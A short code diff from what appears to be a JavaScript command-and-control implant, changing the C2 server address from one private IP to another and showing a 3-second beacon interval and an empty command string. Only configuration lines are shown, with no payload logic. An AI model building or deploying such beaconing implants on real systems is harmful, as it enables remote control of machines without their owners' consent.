@@ -1,4 +1,4 @@
-var c2url = "http://192.168.0.4:8080/"
+var c2url = "http://192.168.69.1:8080/"
 var beaconTime = 3000 //in milliseconds
 
 var curcmd = "{\"cmd\": \"\"}"
